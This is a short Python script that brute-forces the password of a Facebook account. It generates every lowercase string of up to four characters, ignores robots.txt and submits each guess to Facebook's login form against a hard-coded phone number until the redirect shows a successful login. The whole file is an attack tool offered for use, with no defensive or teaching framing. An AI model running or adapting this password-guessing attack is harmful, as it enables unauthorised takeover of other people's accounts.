import mechanize 
import itertools
import string
import re


def bruteforce(charset, maxlength):
    return (''.join(candidate)
        for candidate in itertools.chain.from_iterable(itertools.product(charset, repeat=i)
        for i in range(1, maxlength + 1)))


br = mechanize.Browser()
br.set_handle_equiv(True)
br.set_handle_redirect(True)
br.set_handle_referer(True)
br.set_handle_robots(False)

password_max_length = 5


combos = list(bruteforce(string.ascii_lowercase, 4)) # This one is memory consuming. Be alert.
combos = combos[1000:]

br.open("http://www.facebook.com/login/")
for x in combos:
	for link in br.links():
		link_login = re.compile('\/login.php\?(?!login_attempt)').search( link.url )
		if link_login:
			print link.url
			resp = br.follow_link( link )

	br.select_form( nr = 0 )

  # Use either phone number or email-id

	br.form['email'] = "9840xxxxxx"
	br.form['pass'] = ''.join(x)
	print "Checking ",br.form['pass']
	response=br.submit()
	if response.geturl()=="https://www.facebook.com/home.php":
		#url to which the page is redirected after login
		print "Correct password is ",''.join(x)
		
		break

